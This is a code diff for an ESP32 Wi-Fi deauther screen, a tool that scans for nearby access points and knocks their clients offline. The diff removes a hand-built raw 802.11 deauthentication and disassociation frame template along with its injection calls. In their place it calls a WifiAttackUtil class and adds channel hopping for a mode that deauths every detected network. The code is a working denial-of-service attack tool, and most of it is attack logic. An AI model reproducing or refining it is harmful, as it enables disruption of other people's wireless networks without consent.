@@ -154,20 +154,18 @@ void WifiDeautherScreen::_startDeauth()
   _state   = STATE_DEAUTHING;
   _spinIdx = 0;
 
+  _attacker = new WifiAttackUtil();
+
   if (_mode == MODE_ALL) {
     portENTER_CRITICAL(&_allLock);
     memset(_allTargets, 0, sizeof(_allTargets));
     _allCount = 0;
     portEXIT_CRITICAL(&_allLock);
 
-    // AP mode required for esp_wifi_80211_tx; enable promiscuous after
-    WiFi.mode(WIFI_MODE_AP);
-    WiFi.softAP("No Internet", "12345678", 1, true);
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_promiscuous_rx_cb(&WifiDeautherScreen::_beaconCb);
     _drawStatus("[...] Scanning for APs...");
   } else {
-    _attacker = new WifiAttackUtil();
     _drawStatus(("Deauthing " + _target.ssid + "...").c_str());
   }
 }
@@ -178,13 +176,10 @@ void WifiDeautherScreen::_stopDeauth()
   if (_mode == MODE_ALL) {
     esp_wifi_set_promiscuous_rx_cb(nullptr);
     esp_wifi_set_promiscuous(false);
-    WiFi.softAPdisconnect(true);
-    WiFi.mode(WIFI_OFF);
-  } else {
-    if (_attacker) {
-      delete _attacker;
-      _attacker = nullptr;
-    }
+  }
+  if (_attacker) {
+    delete _attacker;
+    _attacker = nullptr;
   }
   _drawStatus("Deauth stopped.");
   delay(1000);
@@ -193,6 +188,8 @@ void WifiDeautherScreen::_stopDeauth()
 
 void WifiDeautherScreen::_deauthAll()
 {
+  if (!_attacker) return;
+
   // Snapshot under lock so we don't block the beacon callback
   ApEntry local[MAX_ALL];
   int count;
@@ -201,31 +198,16 @@ void WifiDeautherScreen::_deauthAll()
   count = _allCount;
   portEXIT_CRITICAL(&_allLock);
 
-  // Deauth frame template — broadcast dest, AP as both source and BSSID
-  uint8_t frame[26] = {
-    0xc0, 0x00,                          // Frame Control: deauth
-    0x3a, 0x01,                          // Duration
-    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Destination: broadcast
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source MAC (filled per AP)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (filled per AP)
-    0x00, 0x00,                          // Sequence control
-    0x02, 0x00                           // Reason: invalid authentication
-  };
-
-  static uint16_t seq = 0;
-
+  // Deauth all known APs (changes channel per AP internally)
   for (int i = 0; i < count; i++) {
     if (!local[i].valid) continue;
-    esp_wifi_set_channel(local[i].channel, WIFI_SECOND_CHAN_NONE);
-    memcpy(&frame[10], local[i].bssid, 6);
-    memcpy(&frame[16], local[i].bssid, 6);
-    memcpy(&frame[22], &seq, 2);
-    seq++;
-    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
-    frame[0] = 0xa0;  // also send disassoc
-    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
-    frame[0] = 0xc0;  // restore for next iteration
+    _attacker->deauthenticate(local[i].bssid, local[i].channel);
   }
+
+  // Hop to next scan channel AFTER deauth — dwell here until next call (~100ms)
+  // so promiscuous callback can capture beacons on this channel
+  _allChanHop = (_allChanHop % 13) + 1;
+  _attacker->setChannel(_allChanHop);
 }
 
 void WifiDeautherScreen::_drawStatus(const char* msg)
